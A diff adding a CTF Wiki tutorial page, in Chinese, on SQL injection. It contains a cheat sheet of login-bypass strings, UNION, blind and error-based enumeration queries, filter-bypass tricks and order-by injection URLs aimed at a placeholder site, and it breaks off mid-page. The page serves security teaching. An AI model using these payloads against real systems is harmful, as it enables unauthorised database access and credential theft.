@@ -1,0 +1,529 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>SQL 注入 &mdash; CTF Wiki  文档</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="索引"
+              href="../genindex.html"/>
+        <link rel="search" title="搜索" href="../search.html"/>
+    <link rel="top" title="CTF Wiki  文档" href="../index.html"/>
+        <link rel="next" title="XSS 跨站脚本攻击" href="xss.html"/>
+        <link rel="prev" title="WEB 简介" href="index.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> CTF Wiki
+          
+
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">CTF 介绍</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../introduction/history.html">CTF 竞赛的历史</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../introduction/mode.html">CTF 竞赛模式简介</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../introduction/content.html">CTF 竞赛内容</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../introduction/experience.html">线下攻防经验小结</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../introduction/cgc.html">CGC 网络超级挑战赛</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../introduction/resources.html">学习资源</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Misc</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../misc/recon.html">信息搜集技术</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/encode/index.html">编码分析</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/picture/index.html">图片分析</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/archive/index.html">压缩包分析</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/audio/index.html">音频分析</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/disk_memory/index.html">磁盘 / 内存分析</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/cap.html">流量分析</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../misc/others.html">其他</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Crypto</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../crypto/introduction.html">密码学简介</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../crypto/classical/index.html">古典密码</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../crypto/symmetric/index.html">对称加密</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../crypto/asymmetric/index.html">非对称密码</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../crypto/hash/index.html">哈希函数</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../crypto/signature/index.html">数字签名</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../crypto/others/others.html">证书格式</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Web</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="index.html">WEB 简介</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">SQL 注入</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#id1">基本概念</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#id2">常用工具</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#id3">注入常见参数</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#id4">语法参考与小技巧</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#id5">行间注释</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id6">行内注释</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id7">字符串编码</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#id8">后台万能密码</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#id9">注入语句备忘</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#id10">数据库名</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id11">表名</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id12">列名</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id13">根据列名查询所在的表</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id14">绕过引号限制</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id15">绕过字符串黑名单</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id16">条件语句</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id17">延时函数</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#order-by">order by 后的注入</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id18">宽字节注入</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#id19">参考资料</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="xss.html">XSS 跨站脚本攻击</a></li>
+<li class="toctree-l1"><a class="reference internal" href="csrf.html">CSRF 跨站请求伪造</a></li>
+<li class="toctree-l1"><a class="reference internal" href="ssrf.html">SSRF 服务端请求伪造</a></li>
+<li class="toctree-l1"><a class="reference internal" href="php.html">PHP 代码审计</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Reverse</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../reverse/index.html">Reverse Engineering</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Pwn</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../pwn/stackoverflow/index.html">栈溢出</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pwn/fmtstr/index.html">格式化字符串漏洞</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pwn/heap/index.html">堆利用</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Executable</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../executable/elf/index.html">ELF文件</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">CTF Wiki</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+      <li>SQL 注入</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/web/sqli.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="sql">
+<h1>SQL 注入<a class="headerlink" href="#sql" title="永久链接至标题">¶</a></h1>
+<div class="section" id="id1">
+<h2>基本概念<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
+<ul class="simple">
+<li>SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。</li>
+<li>攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。</li>
+<li>如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。</li>
+</ul>
+</div>
+<div class="section" id="id2">
+<h2>常用工具<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h2>
+<ul class="simple">
+<li>Burp Suite：<a class="reference external" href="http://static.hx99.net/static/drops/tools-1548.html">Burp Suite 使用介绍</a></li>
+<li>Tamper Data (Firefox addon)</li>
+<li>HackBar (Firefox addon)</li>
+<li>sqlmap：<a class="reference external" href="http://static.hx99.net/static/drops/tips-143.html">sqlmap 用户手册</a></li>
+</ul>
+</div>
+<div class="section" id="id3">
+<h2>注入常见参数<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h2>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">user()</span></code>：当前数据库用户</li>
+<li><code class="docutils literal"><span class="pre">database()</span></code>：当前数据库名</li>
+<li><code class="docutils literal"><span class="pre">version()</span></code>：当前使用的数据库版本</li>
+<li><code class="docutils literal"><span class="pre">&#64;&#64;datadir</span></code>：数据库存储数据路径</li>
+<li><code class="docutils literal"><span class="pre">concat()</span></code>：联合数据，用于联合两条数据结果。如 <code class="docutils literal"><span class="pre">concat(username,0x3a,password)</span></code></li>
+<li><code class="docutils literal"><span class="pre">group_concat()</span></code>：和 <code class="docutils literal"><span class="pre">concat()</span></code> 类似，如 <code class="docutils literal"><span class="pre">group_concat(DISTINCT+user,0x3a,password)</span></code>，用于把多条数据一次注入出来</li>
+<li><code class="docutils literal"><span class="pre">concat_ws()</span></code>：用法类似</li>
+<li><code class="docutils literal"><span class="pre">hex()</span></code> 和 <code class="docutils literal"><span class="pre">unhex()</span></code>：用于 hex 编码解码</li>
+<li><code class="docutils literal"><span class="pre">load_file()</span></code>：以文本方式读取文件，在 Windows 中，路径设置为 <code class="docutils literal"><span class="pre">\\</span></code></li>
+<li><code class="docutils literal"><span class="pre">select</span> <span class="pre">xxoo</span> <span class="pre">into</span> <span class="pre">outfile</span> <span class="pre">'路径'</span></code>：权限较高时可直接写文件</li>
+</ul>
+</div>
+<div class="section" id="id4">
+<h2>语法参考与小技巧<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h2>
+<div class="section" id="id5">
+<h3>行间注释<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h3>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">--</span></code></li>
+<li><code class="docutils literal"><span class="pre">#</span></code></li>
+</ul>
+</div>
+<div class="section" id="id6">
+<h3>行内注释<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h3>
+<ul>
+<li><p class="first"><code class="docutils literal"><span class="pre">/*注释内容*/</span></code></p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="k">DROP</span><span class="cm">/*comment*/</span><span class="n">sampletable</span><span class="o">`</span>   <span class="n">DR</span><span class="cm">/**/</span><span class="n">OP</span><span class="cm">/*绕过过滤*/</span><span class="n">sampletable</span><span class="o">`</span>   <span class="k">SELECT</span><span class="cm">/*替换空格*/</span><span class="n">password</span><span class="cm">/**/</span><span class="k">FROM</span><span class="cm">/**/</span><span class="n">Members</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first"><code class="docutils literal"><span class="pre">/*!</span> <span class="pre">MYSQL专属</span> <span class="pre">*/</span></code></p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="cm">/*!32302 1/0, */</span> <span class="mi">1</span> <span class="k">FROM</span> <span class="n">tablename</span>
+</pre></div>
+</div>
+</li>
+</ul>
+</div>
+<div class="section" id="id7">
+<h3>字符串编码<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h3>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">ASCII()</span></code>：返回字符的 ASCII 码值</li>
+<li><code class="docutils literal"><span class="pre">CHAR()</span></code>：把整数转换为对应的字符</li>
+</ul>
+</div>
+</div>
+<div class="section" id="id8">
+<h2>后台万能密码<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h2>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">admin'</span> <span class="pre">--</span></code></li>
+<li><code class="docutils literal"><span class="pre">admin'</span> <span class="pre">#</span></code></li>
+<li><code class="docutils literal"><span class="pre">admin'/*</span></code></li>
+<li><code class="docutils literal"><span class="pre">'</span> <span class="pre">or</span> <span class="pre">1=1--</span></code></li>
+<li><code class="docutils literal"><span class="pre">'</span> <span class="pre">or</span> <span class="pre">1=1#</span></code></li>
+<li><code class="docutils literal"><span class="pre">'</span> <span class="pre">or</span> <span class="pre">1=1/*</span></code></li>
+<li><code class="docutils literal"><span class="pre">')</span> <span class="pre">or</span> <span class="pre">'1'='1--</span></code></li>
+<li><code class="docutils literal"><span class="pre">')</span> <span class="pre">or</span> <span class="pre">('1'='1--</span></code></li>
+<li>以不同的用户登陆&nbsp;<code class="docutils literal"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">1,</span> <span class="pre">'anotheruser',</span> <span class="pre">'doesnt</span> <span class="pre">matter',</span> <span class="pre">1--</span></code></li>
+</ul>
+</div>
+<div class="section" id="id9">
+<h2>注入语句备忘<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h2>
+<div class="section" id="id10">
+<h3>数据库名<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="k">database</span><span class="p">();</span>
+<span class="k">SELECT</span> <span class="k">schema_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id11">
+<h3>表名<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
+<ul>
+<li><p class="first">union 查询</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="c1">--MySQL 4版本时用version=9，MySQL 5版本时用version=10</span>
+<span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="k">version</span><span class="o">=</span><span class="mi">10</span><span class="p">;</span>   <span class="cm">/* 列出当前数据库中的表 */</span>
+<span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>   <span class="cm">/* 列出所有用户自定义数据库中的表 */</span>
+<span class="k">SELECT</span> <span class="n">table_schema</span><span class="p">,</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">!=</span><span class="s1">&#39;information_schema&#39;</span> <span class="k">AND</span> <span class="n">table_schema</span><span class="o">!=</span><span class="s1">&#39;mysql&#39;</span><span class="p">;</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first">盲注</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="k">AND</span> <span class="k">SELECT</span> <span class="n">SUBSTR</span><span class="p">(</span><span class="k">table_name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="o">&gt;</span> <span class="s1">&#39;A&#39;</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first">报错</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="k">AND</span><span class="p">(</span><span class="k">SELECT</span> <span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span> <span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">null</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">!</span><span class="mi">1</span><span class="p">)</span><span class="n">x</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">CONCAT</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">),</span><span class="n">FLOOR</span><span class="p">(</span><span class="n">RAND</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)))</span> <span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">||@</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">CONCAT</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">),</span><span class="o">!@</span><span class="p">)</span> <span class="k">HAVING</span> <span class="o">@||</span><span class="k">MIN</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="p">);</span> <span class="k">AND</span> <span class="n">ExtractValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">)));</span>
+<span class="c1">-- 在5.1.5版本中成功。</span>
+</pre></div>
+</div>
+</li>
+</ul>
+</div>
+<div class="section" id="id12">
+<h3>列名<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h3>
+<ul>
+<li><p class="first">union 查询</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">table_name</span> <span class="o">=</span> <span class="s1">&#39;tablename&#39;</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first">盲注</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="k">AND</span> <span class="k">SELECT</span> <span class="n">SUBSTR</span><span class="p">(</span><span class="k">column_name</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="o">&gt;</span> <span class="s1">&#39;A&#39;</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first">报错</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="c1">-- 在5.1.5版本中成功</span>
+<span class="k">AND</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">SOME_EXISTING_TABLE</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">)</span>
+<span class="c1">-- MySQL 5.1版本修复了</span>
+<span class="k">AND</span><span class="p">(</span><span class="k">SELECT</span> <span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span> <span class="mi">1</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="k">null</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">!</span><span class="mi">1</span><span class="p">)</span><span class="n">x</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">CONCAT</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">),</span><span class="n">FLOOR</span><span class="p">(</span><span class="n">RAND</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)))</span> <span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">||@</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">CONCAT</span><span class="p">((</span><span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">),</span><span class="o">!@</span><span class="p">)</span> <span class="k">HAVING</span> <span class="o">@||</span><span class="k">MIN</span><span class="p">(</span><span class="o">@</span><span class="p">:</span><span class="o">=</span><span class="mi">0</span><span class="p">);</span> <span class="k">AND</span> <span class="n">ExtractValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">CONCAT</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">column_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">)));</span>
+</pre></div>
+</div>
+</li>
+<li><p class="first">利用 <code class="docutils literal"><span class="pre">PROCEDURE</span> <span class="pre">ANALYSE()</span></code></p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="c1">-- 这个需要 web 展示页面有你所注入查询的一个字段</span>
+<span class="c1">-- 获得第一个段名</span>
+<span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span> <span class="n">permission</span> <span class="k">FROM</span> <span class="n">Users</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="mi">1</span> <span class="k">PROCEDURE</span> <span class="k">ANALYSE</span><span class="p">()</span>
+<span class="c1">-- 获得第二个段名</span>
+<span class="mi">1</span> <span class="k">LIMIT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="k">PROCEDURE</span> <span class="k">ANALYSE</span><span class="p">()</span>
+<span class="c1">-- 获得第三个段名</span>
+<span class="mi">1</span> <span class="k">LIMIT</span> <span class="mi">2</span><span class="p">,</span><span class="mi">1</span> <span class="k">PROCEDURE</span> <span class="k">ANALYSE</span><span class="p">()</span>
+</pre></div>
+</div>
+</li>
+</ul>
+</div>
+<div class="section" id="id13">
+<h3>根据列名查询所在的表<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h3>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="c1">-- 查询字段名为 username 的表</span>
+<span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">column_name</span> <span class="o">=</span> <span class="s1">&#39;username&#39;</span><span class="p">;</span>
+<span class="c1">-- 查询字段名中包含 username 的表</span>
+<span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="k">column_name</span> <span class="k">LIKE</span> <span class="s1">&#39;%user%&#39;</span><span class="p">;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id14">
+<h3>绕过引号限制<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h3>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="c1">-- hex 编码</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">Users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x61646D696E</span>
+<span class="c1">-- char() 函数</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">Users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="nb">CHAR</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id15">
+<h3>绕过字符串黑名单<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h3>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="s1">&#39;a&#39;</span> <span class="s1">&#39;d&#39;</span> <span class="s1">&#39;mi&#39;</span> <span class="s1">&#39;n&#39;</span><span class="p">;</span>
+<span class="k">SELECT</span> <span class="n">CONCAT</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;i&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">);</span>
+<span class="k">SELECT</span> <span class="n">CONCAT_WS</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;i&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">);</span>
+<span class="k">SELECT</span> <span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;i&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>使用 <code class="docutils literal"><span class="pre">CONCAT()</span></code> 时，任何个参数为 null，将返回 null，推荐使用 <code class="docutils literal"><span class="pre">CONCAT_WS()</span></code>。<code class="docutils literal"><span class="pre">CONCAT_WS()</span></code>函数第一个参数表示用哪个字符间隔所查询的结果。</p>
+</div>
+<div class="section" id="id16">
+<h3>条件语句<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h3>
+<p><code class="docutils literal"><span class="pre">CASE</span></code>, <code class="docutils literal"><span class="pre">IF()</span></code>, <code class="docutils literal"><span class="pre">IFNULL()</span></code>, <code class="docutils literal"><span class="pre">NULLIF()</span></code>.</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="k">IF</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
+<span class="k">SELECT</span> <span class="k">CASE</span> <span class="k">WHEN</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">THEN</span> <span class="k">true</span> <span class="k">ELSE</span> <span class="k">false</span> <span class="k">END</span><span class="p">;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id17">
+<h3>延时函数<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h3>
+<p><code class="docutils literal"><span class="pre">SLEEP()</span></code>, <code class="docutils literal"><span class="pre">BENCHMARK()</span></code>.</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="s1">&#39; - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(&#39;</span><span class="k">true</span><span class="s1">&#39;)), false)) - &#39;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="order-by">
+<h3>order by 后的注入<a class="headerlink" href="#order-by" title="永久链接至标题">¶</a></h3>
+<p><code class="docutils literal"><span class="pre">order</span> <span class="pre">by</span></code> 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 <code class="docutils literal"><span class="pre">order</span></code> 或者 <code class="docutils literal"><span class="pre">order</span> <span class="pre">by</span></code> 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p>
+<p>原始链接：<code class="docutils literal"><span class="pre">http://www.test.com/list.php?order=vote</span></code></p>
+<p>根据 <code class="docutils literal"><span class="pre">vote</span></code> 字段排序。找到投票数最大的票数 <code class="docutils literal"><span class="pre">num</span></code> 然后构造以下链接：</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc
+</pre></div>
+</div>
+<p>看排序是否变化。还有一种方法不需要知道任何字段信息，使用 <code class="docutils literal"><span class="pre">rand</span></code> 函数：</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.test.com/list.php?order=rand(true)
+http://www.test.com/list.php?order=rand(false)
+</pre></div>
+</div>
+<p>以上两个会返回不同的排序，判断表名中第一个字符是否小于 128 的语句如下：</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))
+</pre></div>
+</div>
+</div>
+<div class="section" id="id18">
